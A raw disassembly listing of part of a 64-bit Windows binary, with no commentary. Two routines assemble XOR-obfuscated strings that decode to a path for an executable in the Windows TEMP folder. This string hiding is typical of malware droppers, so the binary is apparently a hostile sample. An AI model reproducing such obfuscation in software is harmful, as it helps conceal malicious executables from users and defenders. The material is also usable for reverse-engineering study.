   1400016c1:	0f 11 02             	movups %xmm0,(%rdx)
   1400016c4:	ff 15 7e 9b 00 00    	call   *0x9b7e(%rip)        # 0x14000b248
   1400016ca:	48 8d 05 9f 9e 00 00 	lea    0x9e9f(%rip),%rax        # 0x14000b570
   1400016d1:	48 89 03             	mov    %rax,(%rbx)
   1400016d4:	48 8b c3             	mov    %rbx,%rax
   1400016d7:	48 83 c4 20          	add    $0x20,%rsp
   1400016db:	5b                   	pop    %rbx
   1400016dc:	c3                   	ret
   1400016dd:	cc                   	int3
   1400016de:	cc                   	int3
   1400016df:	cc                   	int3
   1400016e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400016e4:	48 8d 0d 3d d2 00 00 	lea    0xd23d(%rip),%rcx        # 0x14000e928
   1400016eb:	ff 15 07 9b 00 00    	call   *0x9b07(%rip)        # 0x14000b1f8
   1400016f1:	cc                   	int3
   1400016f2:	cc                   	int3
   1400016f3:	cc                   	int3
   1400016f4:	cc                   	int3
   1400016f5:	cc                   	int3
   1400016f6:	cc                   	int3
   1400016f7:	cc                   	int3
   1400016f8:	cc                   	int3
   1400016f9:	cc                   	int3
   1400016fa:	cc                   	int3
   1400016fb:	cc                   	int3
   1400016fc:	cc                   	int3
   1400016fd:	cc                   	int3
   1400016fe:	cc                   	int3
   1400016ff:	cc                   	int3
   140001700:	48 8d 05 31 d2 00 00 	lea    0xd231(%rip),%rax        # 0x14000e938
   140001707:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000170e:	00 
   14000170f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001713:	48 8d 05 2e d3 00 00 	lea    0xd32e(%rip),%rax        # 0x14000ea48
   14000171a:	48 89 01             	mov    %rax,(%rcx)
   14000171d:	48 8b c1             	mov    %rcx,%rax
   140001720:	c3                   	ret
   140001721:	cc                   	int3
   140001722:	cc                   	int3
   140001723:	cc                   	int3
   140001724:	cc                   	int3
   140001725:	cc                   	int3
   140001726:	cc                   	int3
   140001727:	cc                   	int3
   140001728:	cc                   	int3
   140001729:	cc                   	int3
   14000172a:	cc                   	int3
   14000172b:	cc                   	int3
   14000172c:	cc                   	int3
   14000172d:	cc                   	int3
   14000172e:	cc                   	int3
   14000172f:	cc                   	int3
   140001730:	48 83 ec 48          	sub    $0x48,%rsp
   140001734:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001739:	e8 c2 ff ff ff       	call   0x140001700
   14000173e:	48 8d 15 9b e8 00 00 	lea    0xe89b(%rip),%rdx        # 0x14000ffe0
   140001745:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000174a:	e8 24 80 00 00       	call   0x140009773
   14000174f:	cc                   	int3
   140001750:	40 53                	rex push %rbx
   140001752:	48 83 ec 20          	sub    $0x20,%rsp
   140001756:	48 8b d9             	mov    %rcx,%rbx
   140001759:	48 8b c2             	mov    %rdx,%rax
   14000175c:	48 8d 0d f5 9d 00 00 	lea    0x9df5(%rip),%rcx        # 0x14000b558
   140001763:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001766:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000176a:	48 89 0b             	mov    %rcx,(%rbx)
   14000176d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001771:	0f 11 02             	movups %xmm0,(%rdx)
   140001774:	ff 15 ce 9a 00 00    	call   *0x9ace(%rip)        # 0x14000b248
   14000177a:	48 8d 05 c7 d2 00 00 	lea    0xd2c7(%rip),%rax        # 0x14000ea48
   140001781:	48 89 03             	mov    %rax,(%rbx)
   140001784:	48 8b c3             	mov    %rbx,%rax
   140001787:	48 83 c4 20          	add    $0x20,%rsp
   14000178b:	5b                   	pop    %rbx
   14000178c:	c3                   	ret
   14000178d:	cc                   	int3
   14000178e:	cc                   	int3
   14000178f:	cc                   	int3
   140001790:	48 83 ec 28          	sub    $0x28,%rsp
   140001794:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001798:	48 85 c9             	test   %rcx,%rcx
   14000179b:	74 20                	je     0x1400017bd
   14000179d:	48 8b 01             	mov    (%rcx),%rax
   1400017a0:	ff 50 10             	call   *0x10(%rax)
   1400017a3:	48 85 c0             	test   %rax,%rax
   1400017a6:	74 15                	je     0x1400017bd
   1400017a8:	48 8b 08             	mov    (%rax),%rcx
   1400017ab:	ba 01 00 00 00       	mov    $0x1,%edx
   1400017b0:	4c 8b 01             	mov    (%rcx),%r8
   1400017b3:	48 8b c8             	mov    %rax,%rcx
   1400017b6:	48 83 c4 28          	add    $0x28,%rsp
   1400017ba:	49 ff e0             	rex.WB jmp *%r8
   1400017bd:	48 83 c4 28          	add    $0x28,%rsp
   1400017c1:	c3                   	ret
   1400017c2:	cc                   	int3
   1400017c3:	cc                   	int3
   1400017c4:	cc                   	int3
   1400017c5:	cc                   	int3
   1400017c6:	cc                   	int3
   1400017c7:	cc                   	int3
   1400017c8:	cc                   	int3
   1400017c9:	cc                   	int3
   1400017ca:	cc                   	int3
   1400017cb:	cc                   	int3
   1400017cc:	cc                   	int3
   1400017cd:	cc                   	int3
   1400017ce:	cc                   	int3
   1400017cf:	cc                   	int3
   1400017d0:	81 61 18 ff f9 ff ff 	andl   $0xfffff9ff,0x18(%rcx)
   1400017d7:	48 8b c1             	mov    %rcx,%rax
   1400017da:	81 49 18 00 08 00 00 	orl    $0x800,0x18(%rcx)
   1400017e1:	c3                   	ret
   1400017e2:	cc                   	int3
   1400017e3:	cc                   	int3
   1400017e4:	cc                   	int3
   1400017e5:	cc                   	int3
   1400017e6:	cc                   	int3
   1400017e7:	cc                   	int3
   1400017e8:	cc                   	int3
   1400017e9:	cc                   	int3
   1400017ea:	cc                   	int3
   1400017eb:	cc                   	int3
   1400017ec:	cc                   	int3
   1400017ed:	cc                   	int3
   1400017ee:	cc                   	int3
   1400017ef:	cc                   	int3
   1400017f0:	83 49 18 04          	orl    $0x4,0x18(%rcx)
   1400017f4:	48 8b c1             	mov    %rcx,%rax
   1400017f7:	c3                   	ret
   1400017f8:	cc                   	int3
   1400017f9:	cc                   	int3
   1400017fa:	cc                   	int3
   1400017fb:	cc                   	int3
   1400017fc:	cc                   	int3
   1400017fd:	cc                   	int3
   1400017fe:	cc                   	int3
   1400017ff:	cc                   	int3
   140001800:	40 53                	rex push %rbx
   140001802:	48 83 ec 30          	sub    $0x30,%rsp
   140001806:	48 8d 1d 4b ec 01 00 	lea    0x1ec4b(%rip),%rbx        # 0x140020458
   14000180d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140001812:	48 8b cb             	mov    %rbx,%rcx
   140001815:	e8 46 4c 00 00       	call   0x140006460
   14000181a:	4c 8d 0d bf d0 00 00 	lea    0xd0bf(%rip),%r9        # 0x14000e8e0
   140001821:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140001828:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000182f:	00 
   140001830:	48 ff c1             	inc    %rcx
   140001833:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140001838:	75 f6                	jne    0x140001830
   14000183a:	48 83 3d 2e ec 01 00 	cmpq   $0xf,0x1ec2e(%rip)        # 0x140020470
   140001841:	0f 
   140001842:	48 8b c3             	mov    %rbx,%rax
   140001845:	4c 8b c3             	mov    %rbx,%r8
   140001848:	48 0f 47 05 08 ec 01 	cmova  0x1ec08(%rip),%rax        # 0x140020458
   14000184f:	00 
   140001850:	c6 00 2c             	movb   $0x2c,(%rax)
   140001853:	b8 01 00 00 00       	mov    $0x1,%eax
   140001858:	48 83 3d 10 ec 01 00 	cmpq   $0xf,0x1ec10(%rip)        # 0x140020470
   14000185f:	0f 
   140001860:	4c 0f 47 05 f0 eb 01 	cmova  0x1ebf0(%rip),%r8        # 0x140020458
   140001867:	00 
   140001868:	33 d2                	xor    %edx,%edx
   14000186a:	48 f7 f1             	div    %rcx
   14000186d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001872:	34 3a                	xor    $0x3a,%al
   140001874:	41 88 40 01          	mov    %al,0x1(%r8)
   140001878:	4c 8b c3             	mov    %rbx,%r8
   14000187b:	48 83 3d ed eb 01 00 	cmpq   $0xf,0x1ebed(%rip)        # 0x140020470
   140001882:	0f 
   140001883:	b8 02 00 00 00       	mov    $0x2,%eax
   140001888:	4c 0f 47 05 c8 eb 01 	cmova  0x1ebc8(%rip),%r8        # 0x140020458
   14000188f:	00 
   140001890:	33 d2                	xor    %edx,%edx
   140001892:	48 f7 f1             	div    %rcx
   140001895:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000189a:	34 5c                	xor    $0x5c,%al
   14000189c:	41 88 40 02          	mov    %al,0x2(%r8)
   1400018a0:	4c 8b c3             	mov    %rbx,%r8
   1400018a3:	48 83 3d c5 eb 01 00 	cmpq   $0xf,0x1ebc5(%rip)        # 0x140020470
   1400018aa:	0f 
   1400018ab:	b8 03 00 00 00       	mov    $0x3,%eax
   1400018b0:	4c 0f 47 05 a0 eb 01 	cmova  0x1eba0(%rip),%r8        # 0x140020458
   1400018b7:	00 
   1400018b8:	33 d2                	xor    %edx,%edx
   1400018ba:	48 f7 f1             	div    %rcx
   1400018bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400018c2:	34 57                	xor    $0x57,%al
   1400018c4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400018c8:	4c 8b c3             	mov    %rbx,%r8
   1400018cb:	48 83 3d 9d eb 01 00 	cmpq   $0xf,0x1eb9d(%rip)        # 0x140020470
   1400018d2:	0f 
   1400018d3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400018d8:	4c 0f 47 05 78 eb 01 	cmova  0x1eb78(%rip),%r8        # 0x140020458
   1400018df:	00 
   1400018e0:	33 d2                	xor    %edx,%edx
   1400018e2:	48 f7 f1             	div    %rcx
   1400018e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400018ea:	34 69                	xor    $0x69,%al
   1400018ec:	41 88 40 04          	mov    %al,0x4(%r8)
   1400018f0:	4c 8b c3             	mov    %rbx,%r8
   1400018f3:	48 83 3d 75 eb 01 00 	cmpq   $0xf,0x1eb75(%rip)        # 0x140020470
   1400018fa:	0f 
   1400018fb:	b8 05 00 00 00       	mov    $0x5,%eax
   140001900:	4c 0f 47 05 50 eb 01 	cmova  0x1eb50(%rip),%r8        # 0x140020458
   140001907:	00 
   140001908:	33 d2                	xor    %edx,%edx
   14000190a:	48 f7 f1             	div    %rcx
   14000190d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001912:	34 6e                	xor    $0x6e,%al
   140001914:	41 88 40 05          	mov    %al,0x5(%r8)
   140001918:	4c 8b c3             	mov    %rbx,%r8
   14000191b:	48 83 3d 4d eb 01 00 	cmpq   $0xf,0x1eb4d(%rip)        # 0x140020470
   140001922:	0f 
   140001923:	b8 06 00 00 00       	mov    $0x6,%eax
   140001928:	4c 0f 47 05 28 eb 01 	cmova  0x1eb28(%rip),%r8        # 0x140020458
   14000192f:	00 
   140001930:	33 d2                	xor    %edx,%edx
   140001932:	48 f7 f1             	div    %rcx
   140001935:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000193a:	34 64                	xor    $0x64,%al
   14000193c:	41 88 40 06          	mov    %al,0x6(%r8)
   140001940:	4c 8b c3             	mov    %rbx,%r8
   140001943:	48 83 3d 25 eb 01 00 	cmpq   $0xf,0x1eb25(%rip)        # 0x140020470
   14000194a:	0f 
   14000194b:	b8 07 00 00 00       	mov    $0x7,%eax
   140001950:	4c 0f 47 05 00 eb 01 	cmova  0x1eb00(%rip),%r8        # 0x140020458
   140001957:	00 
   140001958:	33 d2                	xor    %edx,%edx
   14000195a:	48 f7 f1             	div    %rcx
   14000195d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001962:	34 6f                	xor    $0x6f,%al
   140001964:	41 88 40 07          	mov    %al,0x7(%r8)
   140001968:	4c 8b c3             	mov    %rbx,%r8
   14000196b:	48 83 3d fd ea 01 00 	cmpq   $0xf,0x1eafd(%rip)        # 0x140020470
   140001972:	0f 
   140001973:	b8 08 00 00 00       	mov    $0x8,%eax
   140001978:	4c 0f 47 05 d8 ea 01 	cmova  0x1ead8(%rip),%r8        # 0x140020458
   14000197f:	00 
   140001980:	33 d2                	xor    %edx,%edx
   140001982:	48 f7 f1             	div    %rcx
   140001985:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000198a:	34 77                	xor    $0x77,%al
   14000198c:	41 88 40 08          	mov    %al,0x8(%r8)
   140001990:	4c 8b c3             	mov    %rbx,%r8
   140001993:	48 83 3d d5 ea 01 00 	cmpq   $0xf,0x1ead5(%rip)        # 0x140020470
   14000199a:	0f 
   14000199b:	b8 09 00 00 00       	mov    $0x9,%eax
   1400019a0:	4c 0f 47 05 b0 ea 01 	cmova  0x1eab0(%rip),%r8        # 0x140020458
   1400019a7:	00 
   1400019a8:	33 d2                	xor    %edx,%edx
   1400019aa:	48 f7 f1             	div    %rcx
   1400019ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400019b2:	34 73                	xor    $0x73,%al
   1400019b4:	41 88 40 09          	mov    %al,0x9(%r8)
   1400019b8:	4c 8b c3             	mov    %rbx,%r8
   1400019bb:	48 83 3d ad ea 01 00 	cmpq   $0xf,0x1eaad(%rip)        # 0x140020470
   1400019c2:	0f 
   1400019c3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400019c8:	4c 0f 47 05 88 ea 01 	cmova  0x1ea88(%rip),%r8        # 0x140020458
   1400019cf:	00 
   1400019d0:	33 d2                	xor    %edx,%edx
   1400019d2:	48 f7 f1             	div    %rcx
   1400019d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400019da:	34 5c                	xor    $0x5c,%al
   1400019dc:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400019e0:	4c 8b c3             	mov    %rbx,%r8
   1400019e3:	48 83 3d 85 ea 01 00 	cmpq   $0xf,0x1ea85(%rip)        # 0x140020470
   1400019ea:	0f 
   1400019eb:	b8 0b 00 00 00       	mov    $0xb,%eax
   1400019f0:	4c 0f 47 05 60 ea 01 	cmova  0x1ea60(%rip),%r8        # 0x140020458
   1400019f7:	00 
   1400019f8:	33 d2                	xor    %edx,%edx
   1400019fa:	48 f7 f1             	div    %rcx
   1400019fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001a02:	34 54                	xor    $0x54,%al
   140001a04:	41 88 40 0b          	mov    %al,0xb(%r8)
   140001a08:	4c 8b c3             	mov    %rbx,%r8
   140001a0b:	48 83 3d 5d ea 01 00 	cmpq   $0xf,0x1ea5d(%rip)        # 0x140020470
   140001a12:	0f 
   140001a13:	b8 0c 00 00 00       	mov    $0xc,%eax
   140001a18:	4c 0f 47 05 38 ea 01 	cmova  0x1ea38(%rip),%r8        # 0x140020458
   140001a1f:	00 
   140001a20:	33 d2                	xor    %edx,%edx
   140001a22:	48 f7 f1             	div    %rcx
   140001a25:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001a2a:	34 45                	xor    $0x45,%al
   140001a2c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140001a30:	4c 8b c3             	mov    %rbx,%r8
   140001a33:	48 83 3d 35 ea 01 00 	cmpq   $0xf,0x1ea35(%rip)        # 0x140020470
   140001a3a:	0f 
   140001a3b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140001a40:	4c 0f 47 05 10 ea 01 	cmova  0x1ea10(%rip),%r8        # 0x140020458
   140001a47:	00 
   140001a48:	33 d2                	xor    %edx,%edx
   140001a4a:	48 f7 f1             	div    %rcx
   140001a4d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001a52:	34 4d                	xor    $0x4d,%al
   140001a54:	41 88 40 0d          	mov    %al,0xd(%r8)
   140001a58:	4c 8b c3             	mov    %rbx,%r8
   140001a5b:	48 83 3d 0d ea 01 00 	cmpq   $0xf,0x1ea0d(%rip)        # 0x140020470
   140001a62:	0f 
   140001a63:	b8 0e 00 00 00       	mov    $0xe,%eax
   140001a68:	4c 0f 47 05 e8 e9 01 	cmova  0x1e9e8(%rip),%r8        # 0x140020458
   140001a6f:	00 
   140001a70:	33 d2                	xor    %edx,%edx
   140001a72:	48 f7 f1             	div    %rcx
   140001a75:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001a7a:	34 50                	xor    $0x50,%al
   140001a7c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140001a80:	4c 8b c3             	mov    %rbx,%r8
   140001a83:	48 83 3d e5 e9 01 00 	cmpq   $0xf,0x1e9e5(%rip)        # 0x140020470
   140001a8a:	0f 
   140001a8b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140001a90:	4c 0f 47 05 c0 e9 01 	cmova  0x1e9c0(%rip),%r8        # 0x140020458
   140001a97:	00 
   140001a98:	33 d2                	xor    %edx,%edx
   140001a9a:	48 f7 f1             	div    %rcx
   140001a9d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001aa2:	34 5c                	xor    $0x5c,%al
   140001aa4:	41 88 40 0f          	mov    %al,0xf(%r8)
   140001aa8:	4c 8b c3             	mov    %rbx,%r8
   140001aab:	48 83 3d bd e9 01 00 	cmpq   $0xf,0x1e9bd(%rip)        # 0x140020470
   140001ab2:	0f 
   140001ab3:	b8 10 00 00 00       	mov    $0x10,%eax
   140001ab8:	4c 0f 47 05 98 e9 01 	cmova  0x1e998(%rip),%r8        # 0x140020458
   140001abf:	00 
   140001ac0:	33 d2                	xor    %edx,%edx
   140001ac2:	48 f7 f1             	div    %rcx
   140001ac5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001aca:	34 67                	xor    $0x67,%al
   140001acc:	41 88 40 10          	mov    %al,0x10(%r8)
   140001ad0:	4c 8b c3             	mov    %rbx,%r8
   140001ad3:	48 83 3d 95 e9 01 00 	cmpq   $0xf,0x1e995(%rip)        # 0x140020470
   140001ada:	0f 
   140001adb:	b8 11 00 00 00       	mov    $0x11,%eax
   140001ae0:	4c 0f 47 05 70 e9 01 	cmova  0x1e970(%rip),%r8        # 0x140020458
   140001ae7:	00 
   140001ae8:	33 d2                	xor    %edx,%edx
   140001aea:	48 f7 f1             	div    %rcx
   140001aed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001af2:	34 69                	xor    $0x69,%al
   140001af4:	41 88 40 11          	mov    %al,0x11(%r8)
   140001af8:	4c 8b c3             	mov    %rbx,%r8
   140001afb:	48 83 3d 6d e9 01 00 	cmpq   $0xf,0x1e96d(%rip)        # 0x140020470
   140001b02:	0f 
   140001b03:	b8 12 00 00 00       	mov    $0x12,%eax
   140001b08:	4c 0f 47 05 48 e9 01 	cmova  0x1e948(%rip),%r8        # 0x140020458
   140001b0f:	00 
   140001b10:	33 d2                	xor    %edx,%edx
   140001b12:	48 f7 f1             	div    %rcx
   140001b15:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001b1a:	34 61                	xor    $0x61,%al
   140001b1c:	41 88 40 12          	mov    %al,0x12(%r8)
   140001b20:	4c 8b c3             	mov    %rbx,%r8
   140001b23:	48 83 3d 45 e9 01 00 	cmpq   $0xf,0x1e945(%rip)        # 0x140020470
   140001b2a:	0f 
   140001b2b:	b8 13 00 00 00       	mov    $0x13,%eax
   140001b30:	4c 0f 47 05 20 e9 01 	cmova  0x1e920(%rip),%r8        # 0x140020458
   140001b37:	00 
   140001b38:	33 d2                	xor    %edx,%edx
   140001b3a:	48 f7 f1             	div    %rcx
   140001b3d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001b42:	34 6e                	xor    $0x6e,%al
   140001b44:	41 88 40 13          	mov    %al,0x13(%r8)
   140001b48:	4c 8b c3             	mov    %rbx,%r8
   140001b4b:	48 83 3d 1d e9 01 00 	cmpq   $0xf,0x1e91d(%rip)        # 0x140020470
   140001b52:	0f 
   140001b53:	b8 14 00 00 00       	mov    $0x14,%eax
   140001b58:	4c 0f 47 05 f8 e8 01 	cmova  0x1e8f8(%rip),%r8        # 0x140020458
   140001b5f:	00 
   140001b60:	33 d2                	xor    %edx,%edx
   140001b62:	48 f7 f1             	div    %rcx
   140001b65:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001b6a:	34 6e                	xor    $0x6e,%al
   140001b6c:	41 88 40 14          	mov    %al,0x14(%r8)
   140001b70:	4c 8b c3             	mov    %rbx,%r8
   140001b73:	48 83 3d f5 e8 01 00 	cmpq   $0xf,0x1e8f5(%rip)        # 0x140020470
   140001b7a:	0f 
   140001b7b:	b8 15 00 00 00       	mov    $0x15,%eax
   140001b80:	4c 0f 47 05 d0 e8 01 	cmova  0x1e8d0(%rip),%r8        # 0x140020458
   140001b87:	00 
   140001b88:	33 d2                	xor    %edx,%edx
   140001b8a:	48 f7 f1             	div    %rcx
   140001b8d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001b92:	34 69                	xor    $0x69,%al
   140001b94:	41 88 40 15          	mov    %al,0x15(%r8)
   140001b98:	4c 8b c3             	mov    %rbx,%r8
   140001b9b:	48 83 3d cd e8 01 00 	cmpq   $0xf,0x1e8cd(%rip)        # 0x140020470
   140001ba2:	0f 
   140001ba3:	b8 16 00 00 00       	mov    $0x16,%eax
   140001ba8:	4c 0f 47 05 a8 e8 01 	cmova  0x1e8a8(%rip),%r8        # 0x140020458
   140001baf:	00 
   140001bb0:	33 d2                	xor    %edx,%edx
   140001bb2:	48 f7 f1             	div    %rcx
   140001bb5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001bba:	34 30                	xor    $0x30,%al
   140001bbc:	41 88 40 16          	mov    %al,0x16(%r8)
   140001bc0:	4c 8b c3             	mov    %rbx,%r8
   140001bc3:	48 83 3d a5 e8 01 00 	cmpq   $0xf,0x1e8a5(%rip)        # 0x140020470
   140001bca:	0f 
   140001bcb:	b8 17 00 00 00       	mov    $0x17,%eax
   140001bd0:	4c 0f 47 05 80 e8 01 	cmova  0x1e880(%rip),%r8        # 0x140020458
   140001bd7:	00 
   140001bd8:	33 d2                	xor    %edx,%edx
   140001bda:	48 f7 f1             	div    %rcx
   140001bdd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001be2:	34 2e                	xor    $0x2e,%al
   140001be4:	41 88 40 17          	mov    %al,0x17(%r8)
   140001be8:	4c 8b c3             	mov    %rbx,%r8
   140001beb:	48 83 3d 7d e8 01 00 	cmpq   $0xf,0x1e87d(%rip)        # 0x140020470
   140001bf2:	0f 
   140001bf3:	b8 18 00 00 00       	mov    $0x18,%eax
   140001bf8:	4c 0f 47 05 58 e8 01 	cmova  0x1e858(%rip),%r8        # 0x140020458
   140001bff:	00 
   140001c00:	33 d2                	xor    %edx,%edx
   140001c02:	48 f7 f1             	div    %rcx
   140001c05:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001c0a:	34 65                	xor    $0x65,%al
   140001c0c:	41 88 40 18          	mov    %al,0x18(%r8)
   140001c10:	4c 8b c3             	mov    %rbx,%r8
   140001c13:	48 83 3d 55 e8 01 00 	cmpq   $0xf,0x1e855(%rip)        # 0x140020470
   140001c1a:	0f 
   140001c1b:	b8 19 00 00 00       	mov    $0x19,%eax
   140001c20:	4c 0f 47 05 30 e8 01 	cmova  0x1e830(%rip),%r8        # 0x140020458
   140001c27:	00 
   140001c28:	33 d2                	xor    %edx,%edx
   140001c2a:	48 f7 f1             	div    %rcx
   140001c2d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001c32:	34 78                	xor    $0x78,%al
   140001c34:	41 88 40 19          	mov    %al,0x19(%r8)
   140001c38:	4c 8b c3             	mov    %rbx,%r8
   140001c3b:	48 83 3d 2d e8 01 00 	cmpq   $0xf,0x1e82d(%rip)        # 0x140020470
   140001c42:	0f 
   140001c43:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140001c48:	4c 0f 47 05 08 e8 01 	cmova  0x1e808(%rip),%r8        # 0x140020458
   140001c4f:	00 
   140001c50:	33 d2                	xor    %edx,%edx
   140001c52:	48 f7 f1             	div    %rcx
   140001c55:	48 8b c3             	mov    %rbx,%rax
   140001c58:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140001c5d:	80 f1 65             	xor    $0x65,%cl
   140001c60:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140001c64:	48 83 c4 30          	add    $0x30,%rsp
   140001c68:	5b                   	pop    %rbx
   140001c69:	c3                   	ret
   140001c6a:	cc                   	int3
   140001c6b:	cc                   	int3
   140001c6c:	cc                   	int3
   140001c6d:	cc                   	int3
   140001c6e:	cc                   	int3
   140001c6f:	cc                   	int3
   140001c70:	40 53                	rex push %rbx
   140001c72:	48 83 ec 30          	sub    $0x30,%rsp
   140001c76:	48 8d 1d 7b e8 01 00 	lea    0x1e87b(%rip),%rbx        # 0x1400204f8
   140001c7d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140001c82:	48 8b cb             	mov    %rbx,%rcx
   140001c85:	e8 d6 47 00 00       	call   0x140006460
   140001c8a:	4c 8d 0d 5f cc 00 00 	lea    0xcc5f(%rip),%r9        # 0x14000e8f0
   140001c91:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140001c98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001c9f:	00 
   140001ca0:	48 ff c1             	inc    %rcx
   140001ca3:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140001ca8:	75 f6                	jne    0x140001ca0
   140001caa:	48 83 3d 5e e8 01 00 	cmpq   $0xf,0x1e85e(%rip)        # 0x140020510
   140001cb1:	0f 
   140001cb2:	48 8b c3             	mov    %rbx,%rax
   140001cb5:	4c 8b c3             	mov    %rbx,%r8
   140001cb8:	48 0f 47 05 38 e8 01 	cmova  0x1e838(%rip),%rax        # 0x1400204f8
   140001cbf:	00 
   140001cc0:	c6 00 25             	movb   $0x25,(%rax)
   140001cc3:	b8 01 00 00 00       	mov    $0x1,%eax
   140001cc8:	48 83 3d 40 e8 01 00 	cmpq   $0xf,0x1e840(%rip)        # 0x140020510
   140001ccf:	0f 
   140001cd0:	4c 0f 47 05 20 e8 01 	cmova  0x1e820(%rip),%r8        # 0x1400204f8
   140001cd7:	00 
   140001cd8:	33 d2                	xor    %edx,%edx
   140001cda:	48 f7 f1             	div    %rcx
   140001cdd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001ce2:	34 3a                	xor    $0x3a,%al
   140001ce4:	41 88 40 01          	mov    %al,0x1(%r8)
   140001ce8:	4c 8b c3             	mov    %rbx,%r8
   140001ceb:	48 83 3d 1d e8 01 00 	cmpq   $0xf,0x1e81d(%rip)        # 0x140020510
   140001cf2:	0f 
   140001cf3:	b8 02 00 00 00       	mov    $0x2,%eax
   140001cf8:	4c 0f 47 05 f8 e7 01 	cmova  0x1e7f8(%rip),%r8        # 0x1400204f8
   140001cff:	00 
   140001d00:	33 d2                	xor    %edx,%edx
   140001d02:	48 f7 f1             	div    %rcx
   140001d05:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001d0a:	34 5c                	xor    $0x5c,%al
   140001d0c:	41 88 40 02          	mov    %al,0x2(%r8)
   140001d10:	4c 8b c3             	mov    %rbx,%r8
   140001d13:	48 83 3d f5 e7 01 00 	cmpq   $0xf,0x1e7f5(%rip)        # 0x140020510
   140001d1a:	0f 
   140001d1b:	b8 03 00 00 00       	mov    $0x3,%eax
   140001d20:	4c 0f 47 05 d0 e7 01 	cmova  0x1e7d0(%rip),%r8        # 0x1400204f8
   140001d27:	00 
   140001d28:	33 d2                	xor    %edx,%edx
   140001d2a:	48 f7 f1             	div    %rcx
   140001d2d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001d32:	34 57                	xor    $0x57,%al
   140001d34:	41 88 40 03          	mov    %al,0x3(%r8)
   140001d38:	4c 8b c3             	mov    %rbx,%r8
   140001d3b:	48 83 3d cd e7 01 00 	cmpq   $0xf,0x1e7cd(%rip)        # 0x140020510
   140001d42:	0f 
   140001d43:	b8 04 00 00 00       	mov    $0x4,%eax
   140001d48:	4c 0f 47 05 a8 e7 01 	cmova  0x1e7a8(%rip),%r8        # 0x1400204f8
   140001d4f:	00 
   140001d50:	33 d2                	xor    %edx,%edx
   140001d52:	48 f7 f1             	div    %rcx
   140001d55:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001d5a:	34 69                	xor    $0x69,%al
   140001d5c:	41 88 40 04          	mov    %al,0x4(%r8)
   140001d60:	4c 8b c3             	mov    %rbx,%r8
   140001d63:	48 83 3d a5 e7 01 00 	cmpq   $0xf,0x1e7a5(%rip)        # 0x140020510
   140001d6a:	0f 
   140001d6b:	b8 05 00 00 00       	mov    $0x5,%eax
   140001d70:	4c 0f 47 05 80 e7 01 	cmova  0x1e780(%rip),%r8        # 0x1400204f8
   140001d77:	00 
   140001d78:	33 d2                	xor    %edx,%edx
   140001d7a:	48 f7 f1             	div    %rcx
   140001d7d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001d82:	34 6e                	xor    $0x6e,%al
   140001d84:	41 88 40 05          	mov    %al,0x5(%r8)
   140001d88:	4c 8b c3             	mov    %rbx,%r8
   140001d8b:	48 83 3d 7d e7 01 00 	cmpq   $0xf,0x1e77d(%rip)        # 0x140020510
   140001d92:	0f 
